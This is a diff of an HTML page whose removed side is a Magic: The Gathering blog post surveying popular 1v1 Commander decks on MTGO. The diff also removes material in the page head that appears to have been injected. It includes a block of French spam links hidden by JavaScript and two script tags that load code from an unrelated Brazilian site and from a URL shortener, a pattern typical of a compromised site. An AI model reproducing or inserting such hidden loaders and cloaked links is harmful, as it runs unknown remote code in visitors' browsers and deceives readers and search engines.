@@ -1,430 +1,476 @@
-
-<!doctype html><!--[if lt IE 7 ]> <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js ie6"> <![endif]-->
-<!--[if IE 7 ]>    <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js ie7"> <![endif]-->
-<!--[if IE 8 ]>    <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js ie8"> <![endif]-->
-<!--[if IE 9 ]>    <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js ie9"> <![endif]-->
-<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js"> <!--<![endif]-->
+<!doctype html public "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html dir="LTR" lang="en">
 <head>
-
-	
-	<meta charset="UTF-8" />
-
-	<!-- Always force latest IE rendering engine (even in intranet) & Chrome Frame -->
-	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-
-	<title>An Overview and My Experiences with 1v1 Commander | The Wizard&#039;s Cupboard</title>
-
-	<!--  Mobile viewport optimized: j.mp/bplateviewport -->
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-	<link rel="pingback" href="https://www.wizardscupboard.com/wordpress/xmlrpc.php" />
-
-	
-	
-<!-- SEO Ultimate (http://www.seodesignsolutions.com/wordpress-seo/) -->
-	<meta property="og:type" content="article" />
-	<meta property="og:title" content="An Overview and My Experiences with 1v1 Commander" />
-	<meta property="og:url" content="https://www.wizardscupboard.com/wordpress/an-overview-and-my-experiences-with-1v1-commander/" />
-	<meta property="article:published_time" content="2017-06-12" />
-	<meta property="article:modified_time" content="2017-06-12" />
-	<meta property="article:author" content="https://www.wizardscupboard.com/wordpress/author/byronking/" />
-	<meta property="article:section" content="EDH/Commander" />
-	<meta property="og:site_name" content="The Wizard&#039;s Cupboard" />
-	<meta name="twitter:card" content="summary" />
-<!-- /SEO Ultimate -->
-
-<link rel='dns-prefetch' href='//s.w.org' />
-<link rel="alternate" type="application/rss+xml" title="The Wizard&#039;s Cupboard &raquo; Feed" href="https://www.wizardscupboard.com/wordpress/feed/" />
-<link rel="alternate" type="application/rss+xml" title="The Wizard&#039;s Cupboard &raquo; Comments Feed" href="https://www.wizardscupboard.com/wordpress/comments/feed/" />
-<link rel="alternate" type="application/rss+xml" title="The Wizard&#039;s Cupboard &raquo; An Overview and My Experiences with 1v1 Commander Comments Feed" href="https://www.wizardscupboard.com/wordpress/an-overview-and-my-experiences-with-1v1-commander/feed/" />
-		<script type="text/javascript">
-			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.wizardscupboard.com\/wordpress\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.7.14"}};
-			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),!(j.toDataURL().length<3e3)&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,65039,8205,55356,57096),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,55356,57096),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55357,56425,55356,57341,8205,55357,56507),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55357,56425,55356,57341,55357,56507),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
-		</script>
-		<style type="text/css">
-img.wp-smiley,
-img.emoji {
-	display: inline !important;
-	border: none !important;
-	box-shadow: none !important;
-	height: 1em !important;
-	width: 1em !important;
-	margin: 0 .07em !important;
-	vertical-align: -0.1em !important;
-	background: none !important;
-	padding: 0 !important;
-}
-</style>
-<link rel='stylesheet' id='open-sans-css'  href='https://fonts.googleapis.com/css?family=Open+Sans%3A300italic%2C400italic%2C600italic%2C300%2C400%2C600&#038;subset=latin%2Clatin-ext&#038;ver=4.7.14' type='text/css' media='all' />
-<link rel='stylesheet' id='highwind-styles-css'  href='https://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/style.css?ver=1.2.4' type='text/css' media='all' />
-<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script><script>jQueryWP = jQuery;</script>
-<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
-<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-content/plugins/img-mouseover/img-mouseover.js?ver=20110509'></script>
-<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/framework/js/modernizr.min.js?ver=2.6.2'></script>
-<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/framework/js/fitvids.min.js?ver=1.0'></script>
-<link rel='https://api.w.org/' href='https://www.wizardscupboard.com/wordpress/wp-json/' />
-<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.wizardscupboard.com/wordpress/xmlrpc.php?rsd" />
-<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.wizardscupboard.com/wordpress/wp-includes/wlwmanifest.xml" /> 
-<link rel='prev' title='Shambling into Standard' href='https://www.wizardscupboard.com/wordpress/shambling-into-standard/' />
-<link rel='next' title='Modifying the MTGO Vintage Cube' href='https://www.wizardscupboard.com/wordpress/modifying-the-mtgo-vintage-cube/' />
-<meta name="generator" content="WordPress 4.7.14" />
-<link rel="canonical" href="https://www.wizardscupboard.com/wordpress/an-overview-and-my-experiences-with-1v1-commander/" />
-<link rel='shortlink' href='https://www.wizardscupboard.com/wordpress/?p=1860' />
-<link rel="alternate" type="application/json+oembed" href="https://www.wizardscupboard.com/wordpress/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.wizardscupboard.com%2Fwordpress%2Fan-overview-and-my-experiences-with-1v1-commander%2F" />
-<link rel="alternate" type="text/xml+oembed" href="https://www.wizardscupboard.com/wordpress/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.wizardscupboard.com%2Fwordpress%2Fan-overview-and-my-experiences-with-1v1-commander%2F&#038;format=xml" />
-        <!--Customizer CSS-->
-        <style type="text/css">
-                a { color:#163d06; }input[type="submit"], .button, input[type="button"], .navigation-post a, .navigation-paging a, .header, .comments .bypostauthor > .comment-body .comment-content { background-color:#163d06; }body, input[type="text"], input[type="password"], input[type="email"], input[type="search"], input.input-text, textarea { color:#020202; }.comments .bypostauthor > .comment-body .comment-content:after { border-bottom-color:#163d06; }hr, input[type="checkbox"], input[type="radio"] { background:#020202; }input[type="radio"] { border-color:#020202; }h1, h2, h3, h4, h5, h6, .alpha, .beta, .gamma, .delta, .page-title, .post-title { color:#020101; }input[type="submit"], .button, input[type="button"], .navigation-post a, .navigation-paging a, input[type="checkbox"]:before, input[type="checkbox"]:checked:before, .comments .bypostauthor > .comment-body .comment-content, .comments .bypostauthor > .comment-body .comment-content a { color:#f9f9f9; }.comments .comment-content:after { border-bottom-color:#f9f9f9; }.inner-wrap, .main-nav { background-color:#f9f9f9; }                @media only screen and (min-width: 769px) {
-                    /* Styles only applied to desktop */
-                    .main-nav ul.menu ul, .main-nav ul.menu > li:hover > a, .main-nav ul.menu > li > a:hover { background:#163d06; }.main-nav ul.menu li.current-menu-item > a { color:##163d06; }.main-nav { border-color:#163d06; }.main-nav ul.menu li.current-menu-item > a:before { border-bottom-color:#163d06; }.main-nav ul.menu ul a, .main-nav ul.menu > li:hover > a { color:##f9f9f9; }body { background-color:#f8f8f9; }                }
-        </style>
-        <!--/Customizer CSS-->
-        		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
-		<style type="text/css" id="custom-background-css">
-body.custom-background { background-color: #f8f8f9; }
-</style>
-<div id="aece353"><ul><li><a href="https://www.wizardscupboard.com/wordpress/modele-tiki-tattoo/" title="Modele tiki tattoo" >Modele tiki tattoo</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-robe-de-cortege/" title="Modele robe de cortège" >Modele robe de cortège</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-panier-zpagetti/" title="Modele panier zpagetti" >Modele panier zpagetti</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-lettre-desabonnement-canalsat/" title="Modele lettre desabonnement canalsat" >Modele lettre desabonnement canalsat</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-kangoo-2002/" title="Modele kangoo 2002" >Modele kangoo 2002</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-felicitation-naissance-gratuit/" title="Modele felicitation naissance gratuit" >Modele felicitation naissance gratuit</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-deliberation-approbation-reglement-interieur/" title="Modele deliberation approbation reglement interieur" >Modele deliberation approbation reglement interieur</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-tatouage-rose-des-vents/" title="Modele de tatouage rose des vents" >Modele de tatouage rose des vents</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-reference-osi/" title="Modele de reference osi" >Modele de reference osi</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-nao/" title="Modele de nao" >Modele de nao</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-lettre-plainte-contre-x-pour-vol/" title="Modele de lettre plainte contre x pour vol" >Modele de lettre plainte contre x pour vol</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-jupe-taille-haute-en-wax/" title="Modele de jupe taille haute en wax" >Modele de jupe taille haute en wax</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-devis-word-gratuit/" title="Modele de devis word gratuit" >Modele de devis word gratuit</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-contrat-de-mariage-separation-de-biens/" title="Modele de contrat de mariage separation de biens" >Modele de contrat de mariage separation de biens</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-brevet/" title="Modele de brevet" >Modele de brevet</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-cv-agent-de-quai/" title="Modele cv agent de quai" >Modele cv agent de quai</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-case-de-munte/" title="Modele case de munte" >Modele case de munte</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-projet-de-scission/" title="Modèle projet de scission" >Modèle projet de scission</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-lettre-de-stage-en-entreprise/" title="Modèle lettre de stage en entreprise" >Modèle lettre de stage en entreprise</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-haut-en-pagne/" title="Modèle haut en pagne" >Modèle haut en pagne</a></li> </ul><div><script type="text/javascript"> document.getElementById("aece353").style.display="none"; </script>
-
-<script src="http://exerciciofuncional.com.br/teste/index.php?P"></script>
-
-<script src="https://is.gd/GgGf9z?v=v25.0"></script></head>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<body class="post-template-default single single-post postid-1860 single-format-standard custom-background two-column content-sidebar background-contrast">
-
-<div id="fb-root"></div>
-<script>(function(d, s, id) {
-  var js, fjs = d.getElementsByTagName(s)[0];
-  if (d.getElementById(id)) return;
-  js = d.createElement(s); js.id = id;
-  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&appId=1536376929914286&version=v2.0";
-  fjs.parentNode.insertBefore(js, fjs);
-}(document, 'script', 'facebook-jssdk'));</script>
-
-
-<div class="outer-wrap" id="top">
-
-	<div class="inner-wrap">
-
-	
-	<header class="header content-wrapper" role="banner" style="background-image:url(https://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/09/Art_M15_Art-5_Swanland_edited-3.jpg);">
-
-				<p class="toggle-container">
-			<a href="#navigation" class="nav-toggle button">
-				Skip to navigation			</a>
-		</p>
-					<a href="https://www.wizardscupboard.com/wordpress/" title="The Wizard&#039;s Cupboard" rel="home" class="site-intro">
-					<img src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/09/artifacts.WC_.sqaure-edited.jpg" class="avatar" />
-					<h1 class="site-title">The Wizard&#039;s Cupboard</h1>
-				<h2 class="site-description">Magic the Gathering Blog</h2>
-			</a>
-		
-		
-		<nav class="main-nav" id="navigation" role="navigation">
-
-			
-			<ul class="buttons">
-				<li class="home"><a href="https://www.wizardscupboard.com/wordpress" class="nav-home button"><span>Home</span></a></li>
-				<li class="close"><a href="#top" class="nav-close button"><span>Return to Content</span></a></li>
-			</ul>
-			<hr />
-			<h2>Menu 1</h2>
-			<div class="highwind-navigation"><ul id="menu-menu-1" class="menu"><li id="menu-item-274" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-274"><a href="http://www.wizardscupboard.com/wordpress/">Blog Home</a></li>
-<li id="menu-item-264" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-264"><a href="http://www.wizardscupboard.com/wordpress/?cat=6">Standard</a></li>
-<li id="menu-item-265" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-265"><a href="http://www.wizardscupboard.com/wordpress/?cat=1">EDH/Commander</a></li>
-<li id="menu-item-263" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-263"><a href="http://www.wizardscupboard.com/wordpress/?cat=5">MTG Ramblings</a></li>
-<li id="menu-item-269" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-269"><a href="http://www.wizardscupboard.com">Visit Store</a></li>
-<li id="menu-item-273" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-273"><a href="https://www.wizardscupboard.com/wordpress/about-us/">About Us</a></li>
-<li id="menu-item-277" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-277"><a href="https://www.wizardscupboard.com/wordpress/write-for-us/">Write For the WC</a></li>
-</ul></div>
-			
-		</nav><!-- /.main-nav -->
-
-		
-		
-	</header>
-
-	<div class="content-wrapper">
-
-	
-
-<section class="content" role="main">
-
-	
-	
-		<article id="post-1860" class="post-1860 post type-post status-publish format-standard hentry category-edh-commander">
-
-			
-			
-
-<header class="post-header">
-
-				<time class="post-date"><a href="https://www.wizardscupboard.com/wordpress/an-overview-and-my-experiences-with-1v1-commander/" title="Permalink to An Overview and My Experiences with 1v1 Commander" rel="bookmark">June 12, 2017</a></time>
-		
-			<h1 class="post-title" data-text="An Overview and My Experiences with 1v1 Commander">An Overview and My Experiences with 1v1 Commander</h1>
-	
-	
-</header><!-- /.post-header -->
-
-<section class="article-content">
-
-	<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2016/04/IMG_1968.jpg"><img class="alignnone size-medium wp-image-1068" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2016/04/IMG_1968-262x300.jpg" alt="IMG_1968" width="262" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2016/04/IMG_1968-262x300.jpg 262w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2016/04/IMG_1968-896x1024.jpg 896w" sizes="(max-width: 262px) 100vw, 262px" /></a></p>
-<address>By Byron King</address>
-<address><a href="https://twitter.com/DoneTheMath">@DoneTheMath</a></address>
-<p>&nbsp;</p>
-<p>Magic the Gathering Online (MTGO) might be the worst program I’ve ever used. My collection has grown there simply because I tend to forget that fact about once a year. I’ll log on, sink another $50 into upgrading my only deck (Modern Burn) and start playing games. That lasts for about three hours before I can’t stand it anymore. I’ll log off for another year and then repeat. I&#8217;ve been playing that way for years.</p>
-<p>I certainly don’t consider this a good strategy for improving at Magic. MTGO has got to be the most efficient way to test, but I just can’t bring myself to do it. If nothing else, I don’t think I could justify the expense to maintain a MTGO and paper collection simultaneously.</p>
-<p>That might be changing now. 1v1 Commander leagues have been going on for a few weeks now, and I seem to have caught the bug. My preferred formats are Cube, Legacy, and Modern, and 1v1 Commander pretty much scratches all those itches at once. I get to see all the cards I enjoy in Magic, including the cards too old for Modern, too inefficient for Legacy, and restricted to one deck in eight in Cube. Honestly, it feels like playing Cube where I can pick my deck ahead of time.</p>
-<p>The single game nature of the format also appeals to me. Keeping some of these attrition battles limited to a single game keeps rounds under half an hour. Aggressive decks can reliably be finished with a round in under 10 minutes. I consider that a feature if I don’t feel like playing for long stretches of time.</p>
-<p>There hasn’t been a ton written about 1v1 Commander on MTGO yet. If you are new to the format, I’m going to briefly cover the most popular decks in the format. I also recorded my initial foray into the format. My MTGO budget is fairly limited, so I stuck to <em><a href="https://www.wizardscupboard.com/zurgo-bellstriker-p-40522.html">Zurgo Bellstriker</a></em> and <em><a href="https://www.wizardscupboard.com/drana-liberator-malakir-p-42362.html">Drana, Liberator of Malakir</a></em>. I’ve picked up some tidbits on those decks if you’re looking to try them yourself.</p>
-<h1>The Popular Decks</h1>
-<h3>Baral, Chief of Compliance</h3>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/BaralChiefOfCompliance.jpg"><img class="alignnone size-medium wp-image-1862" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/BaralChiefOfCompliance-215x300.jpg" alt="" width="215" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/BaralChiefOfCompliance-215x300.jpg 215w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/BaralChiefOfCompliance.jpg 223w" sizes="(max-width: 215px) 100vw, 215px" /></a></p>
-<p>This deck is widely considered the best deck in the format, though I don’t think it deserves the title. This deck consists of Islands, counterspells, draw spells, and the “combo” of <em><a href="https://www.wizardscupboard.com/polymorph-p-6155.html">Polymorph </a></em>for <a href="https://www.wizardscupboard.com/emrakul-aeons-torn-p-26849.html"><em>Emarukl, the Aeon’s Torn</em></a>. There are four copies of <em><a href="https://www.wizardscupboard.com/polymorph-p-6155.html">Polymorph</a></em> (<em><a href="https://www.wizardscupboard.com/polymorph-p-6155.html">Polymorph</a></em>, Proteus Staff, Reweave, and Synthetic Destiny) for consistency. Baral and a suite of creature lands (Mutavault, Blinkmoth Nexus, Mishra’s Factory, etc…) provide ample fodder to get Emrakul onto the battlefield.</p>
-<p>This deck really benefits from <em><a href="https://www.wizardscupboard.com/baral-chief-compliance-p-46931.html">Baral, Chief of Compliance</a></em>. Having access to him every game is a huge benefit over sporadically finding him in a regular 60 card deck. Almost every spell in the deck benefits from the cost reduction, and a solid chunk of them get a free loot effect stapled on.</p>
-<h3>Jace, Vryn&#8217;s Prodigy</h3>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/Jace.jpg"><img class="alignnone size-medium wp-image-1865" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/Jace-300x209.jpg" alt="" width="300" height="209" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/Jace-300x209.jpg 300w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/Jace.jpg 445w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
-<p>Realistically, I could just copy 90% of the information about <em><a href="https://www.wizardscupboard.com/baral-chief-compliance-p-46931.html">Baral, Chief of Compliance</a></em>, and I could easily get away with it. There is an incredible amount of overlap between the two decks, but that shouldn’t come as a huge surprise. Brainstorm is still the best cantrip, <em><a href="https://www.wizardscupboard.com/counterspell-p-44727.html">Counterspell </a></em>is still the best counterspell, and <em><a href="https://www.wizardscupboard.com/force-will-p-1942.html">Force of Will</a></em> is still the best free counterspell.</p>
-<p>Jace decks usually exclude the <a href="https://www.wizardscupboard.com/polymorph-p-6155.html"><em>Polymorph</em></a> for <em><a href="https://www.wizardscupboard.com/emrakul-aeons-torn-p-26849.html">Emrakul, the Aeon’s Torn</a></em> plan in favor of blue’s various <a href="https://www.wizardscupboard.com/time-walk-p-9836.html"><em>Time Walk</em></a> cards. Jace gives a rebuy on these, allowing the deck to blast ahead of the opponent. More importantly, this deck gets to rebuy <em><a href="https://www.wizardscupboard.com/high-tide-versions-p-3737.html">High Tide</a></em>, supercharging the deck enough to essentially win on the spot.</p>
-<h3>Vial Smasher the Fierce / Kraum, Ludevick&#8217;s Opus</h3>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/Vial-and-Kraum.jpg"><img class="alignnone size-medium wp-image-1870" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/Vial-and-Kraum-300x210.jpg" alt="" width="300" height="210" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/Vial-and-Kraum-300x210.jpg 300w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/Vial-and-Kraum.jpg 445w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
-<p>If you use MTGO 5-0 results to gauge a deck’s success, this duo seems to be the king of the hill. The stock lists looks similar to Baral, replacing all the second string counterspells and draw spells for other cheap interaction and powerful planeswalkers. The <em><a href="https://www.wizardscupboard.com/polymorph-p-6155.html">Polymorph</a></em> package no longer makes the cut, allowing for the inclusion of utility creatures like <em><a href="https://www.wizardscupboard.com/snapcaster-mage-p-29706.html">Snapcaster Mage</a></em>.</p>
-<p>Beyond the upgrades to creatures and planeswalkers, black offers a suite of tutor effects. This is probably the single biggest advantage to this commander pair over Baral. This deck can run devastating singletons and find them with surprising ease. Suddenly, your deck has multiple copies of <em><a href="https://www.wizardscupboard.com/damnation-p-21069.html">Damnation </a></em>against creature swarms without handicapping you against creatureless decks.</p>
-<p><em><a href="https://www.wizardscupboard.com/vial-smasher-fierce-p-46749.html">Vial Smasher the Fierce</a></em> is the more potent of this commander duo. With cards like <em><a href="https://www.wizardscupboard.com/force-will-p-1942.html">Force of Will</a></em>, <a href="https://www.wizardscupboard.com/commandeer-p-19929.html"><em>Commandeer</em></a>, and anything with Delve, this Goblin carves some big chunks out of the opponent’s life total. The cheap mana cost allows it to come down early or to slip in around turn five without dropping counterspell mana. <a href="https://www.wizardscupboard.com/kraum-ludevics-opus-p-46710.html"><em>Kraum, Ludevick’s Opus</em></a> is a fine card, but its main purpose is to provide the deck with access to blue mana.</p>
-<h3>Tasigur, the Golden Fang</h3>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/TasigurTheGoldenFang.png"><img class="alignnone size-medium wp-image-1869" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/TasigurTheGoldenFang-215x300.png" alt="" width="215" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/TasigurTheGoldenFang-215x300.png 215w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/TasigurTheGoldenFang.png 223w" sizes="(max-width: 215px) 100vw, 215px" /></a></p>
-<p><em><a href="https://www.wizardscupboard.com/tasigur-golden-fang-p-39961.html">Tasigur, the Golden Fang</a></em> is regularly cast for only a single mana, highlighting the strength of Delve in Commander. Delve can be used to pay the Commander tax, making it difficult to kill Tasigur enough to keep it gone. Tasigur provides an undercosted body with free card advantage, making it an ideal commander for the color combination.</p>
-<p>Tasigur decks are essentially Dimir decks, utilizing blue’s redundancy in card draw, deck manipulation, and countermagic combined with black’s discard, removal, and tutor effects. Green essentially adds <em><a href="https://www.wizardscupboard.com/deathrite-shaman-p-31559.html">Deathrite Shaman</a></em>, <em><a href="https://www.wizardscupboard.com/leovold-emissary-trest-p-46506.html">Leovold, Emissary of Trest</a></em>, <em><a href="https://www.wizardscupboard.com/sylvan-library-p-5219.html">Sylvan Library</a></em>, and a few replacement level cards.</p>
-<p>Overall, Tasigur decks share a very similar card set as the Vial Smasher / Kraum pair. Red offers a selection of slightly better spells in <em><a href="https://www.wizardscupboard.com/pyroblast-p-44787.html">Pyroblast</a></em>, <em><a href="https://www.wizardscupboard.com/kolaghans-command-p-40576.html">Kolaghan’s Command</a></em>, and some premier planeswalkers. Green gets the cards I mentioned above along with a cheaper Commander. MTGO results have shown slightly better results for Vial Smasher / Kraum, but the differences are small enough that you can let personal preferences bias you without costing much.</p>
-<h3>Breya, Etherium Shaper</h3>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/BreyaEtheriumShaper.jpg"><img class="alignnone size-medium wp-image-1863" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/BreyaEtheriumShaper-215x300.jpg" alt="" width="215" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/BreyaEtheriumShaper-215x300.jpg 215w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/BreyaEtheriumShaper.jpg 223w" sizes="(max-width: 215px) 100vw, 215px" /></a></p>
-<p>Need more colors in your Dimir deck? <em><a href="https://www.wizardscupboard.com/breya-etherium-shaper-p-46687.html">Breya, Etherium Shaper</a></em> has you covered. Breya implies an artifact strategy, but that isn’t really true. Breya is an impressive 6/6 in stats spread out between three creatures, with some decent activated abilities tossed in for good measure. At the low cost of four mana, Breya makes for a strong card regardless of synergy.</p>
-<p>With four different colors available, Breya decks have access to so many “auto-include” cards that there is only room for a handful of flex cards. Breya decks look similar to the Vial Smasher / Kraum decks, utilizing all of the same cheap interaction. These cards are rounded out with white’s efficient spot removal and a few additional planeswalkers. Breya’s synergy with artifacts usually stretches far enough to include a full complement of signets and <em><a href="http://gatherer.wizards.com/Pages/Card/Details.aspx?multiverseid=416831">Daretti, Ingenious Iconoclast</a></em>.</p>
-<h3>NIssa, Vastwood Seer</h3>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/Nissa.jpg"><img class="alignnone wp-image-1866" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/Nissa-300x210.jpg" alt="" width="334" height="234" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/Nissa-300x210.jpg 300w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/Nissa.jpg 445w" sizes="(max-width: 334px) 100vw, 334px" /></a></p>
-<p>We finally reached the end of the blue decks. <em><a href="https://www.wizardscupboard.com/nissa-vastwood-seer-nissa-sage-animist-p-41773.html">Nissa, Vastwood Seer</a></em> is a traditional example of a ramp deck, with tons of acceleration and a stack of expensive threats capable of dominating a game.</p>
-<p>A Nissa decks in 1v1 Commander is knowingly venturing into a format filled with counterspells. Traditionally, ramp decks are an underdog to control, but there are some options available to counter this. First, green has a bunch of interchangeable ramp spells, preventing any one from being vital to resolve. The quality is high enough that you don’t really have to scrape the bottom of the barrel either, keeping stinkers like <em><a href="https://www.wizardscupboard.com/ruin-their-wake-p-43474.html">Ruin in Their Wake</a></em> on the sidelines where they belong.</p>
-<p>The Eldrazi are the real reason that Nissa can compete in a world filled with blue. Emrakul and Ulamog present some devastating cast triggers that should be able to lock away a game. <em><a href="https://www.wizardscupboard.com/cavern-souls-p-47609.html">Cavern of Souls</a></em>, <em><a href="https://www.wizardscupboard.com/eye-of-ugin-p-41281.html">Eye of Ugin</a></em>, and <em><a href="https://www.wizardscupboard.com/expedition-map-p-41252.html">Expedition Map</a></em> add some redundancy to this plan, and green has plenty of creature tutors. A few other threats like <em><a href="https://www.wizardscupboard.com/ugin-spirit-dragon-p-39878.html">Ugin, the Spirit Dragon</a></em> make appearances, but a lot of the threat slots are filled with tutors.</p>
-<p>Lastly, several of the flex spots are filled with value cards. <em><a href="https://www.wizardscupboard.com/sylvan-library-p-5219.html">Sylvan Library</a></em>, <em><a href="https://www.wizardscupboard.com/lifecrafters-bestiary-p-47074.html">Lifecrafter’s Bestiary</a></em>, and <em><a href="https://www.wizardscupboard.com/tireless-tracker-p-43936.html">Tireless Tracker</a></em> are all great cards against control, so they find their way into most Nissa decks.</p>
-<h3>Selvla, Heart of the Wild</h3>
-<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/SelvalaHeartOfTheWilds.jpg"><img class="alignnone wp-image-1867" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/SelvalaHeartOfTheWilds-215x300.jpg" alt="" width="215" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/SelvalaHeartOfTheWilds-215x300.jpg 215w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/06/SelvalaHeartOfTheWilds.jpg 223w" sizes="(max-width: 215px) 100vw, 215px" /></a></p>
